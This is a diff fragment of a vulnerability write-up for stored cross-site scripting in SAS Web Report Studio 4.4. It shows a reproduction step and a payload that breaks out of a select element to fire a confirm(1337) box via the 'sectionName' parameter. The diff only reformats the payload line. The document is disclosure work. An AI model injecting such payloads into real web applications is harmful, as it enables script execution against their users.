@@ -17,7 +17,7 @@ Writeup for Stored Cross-Site Scripting(XSS) on SAS® Web Report Studio 4.4
 <br><br>
 [4.] Click "OK" button > under "sectionName" parameter, insert payload(below) 
 <br><br>
-**payload** : "></option></select><marquee/onstart=confirm(1337)>
+**payload** : `"></option></select><marquee/onstart=confirm(1337)>`
 <br><br>
 <img src="https://github.com/saitamang/POC-DUMP/blob/main/SAS/Web%20Report%20Studio/img/3%20-%20insert%20payload%20xss.png" title="4">
 <br><br>
